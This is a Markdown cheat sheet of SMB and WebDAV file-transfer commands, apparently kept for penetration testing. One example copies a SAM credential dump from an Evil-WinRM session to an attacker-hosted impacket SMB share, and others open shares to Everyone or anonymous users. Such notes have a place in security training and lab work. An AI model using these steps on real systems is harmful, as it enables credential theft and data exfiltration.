# Data Exchange

## SMB

### cmd

```bash
# creates an smb share and grants everyone full access
net share Public=C:\ClusterStorage\Volume1\VMFiles /GRANT:Everyone,FULL
# net share create sometimes doesnt work - try without /GRANT !!!
# without GRANT it allows Everyone to READ the share (Everyone is any local or domain user)
# !!!!!!!!!!!!!!!!!!!!!
# DO NOT FORGET TO EDIT THE NTFS SECURITY SETTINGS OF THE SHARED DIRECTORY AS WELL
# GUI (File Manager): $DIR_NAME -> Properties -> Security -> Edit
# !!!!!!!!!!!!!!!!!!!!!
# USER that is accessing the share must be valid either locally to the machine or in the domain
smbclient //192.168.122.13/Public --user victor

### MOUNT smb share to X:
net use X: \\SERVER\Share

### UNMOUNT
net use X: /delete
```

### impacket-smbclient

```bash
./smbclient.py fuser:fuser@127.0.0.1

ls Machine\Scripts\*       # list content of directory

shares                     # list shares
use $SHARE                 # use a share

get $FILE                  # download file
mget *                     # download everything from current directory
```

### impacket-smbserver

```bash
### EXAMPLE 1
# host
sudo impacket-smbserver -smb2support MyCoolShare ./
# remote machine
*Evil-WinRM* PS C:\tmp> copy-item -path ./SAM_DUMP -destination \\10.10.16.7\MyCoolShare\sam_dump


### EXAMPLE 2
impacket-smbserver $FULL_PATH -smb2support -user $USERNAME -password $PASSWD
# sudo ./.local/bin/smbserver.py -smb2support -user fuser -password fuser share .


### EXAMPLE 3
# host
impacket-smbserver [SHARE_NAME] [FULL_PATH_TO_SHARE] -smb2support -user [USERNAME] -password [PASSWD]

# remote machine
$pass = convertto-securestring '[PASSWD]' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('[USERNAME]', $pass)
New-PSDrive -Name [DRIVE_NAME] -PSProvider FileSystem -Credential $cred -Root \\[REMOTE_HOST]\[SHARE_NAME]
cd [SHARE_NAME]:\
```

### pwsh

```bash
### CREATION
# creates an smb share and grants "Finance Users" and "HR Users" write access.
New-SmbShare -Name 'VMSFiles' -Path 'C:\ClusterStorage\Volume1\VMFiles' -ChangeAccess 'CONTOSO\Finance Users','CONTOSO\HR Users' -FullAccess 'Administrators'

### MOUNT
# mounts smb share
New-SmbMapping -LocalPath 'X:' -RemotePath '\\192.168.1.69\VMFiles'
```

## WebDAV

### wsgidav

```bash
# local
wsgidav --host=0.0.0.0 --port=8080 --root=. --auth=anonymous

# remote
net use E: http://192.168.1.145:8080
```
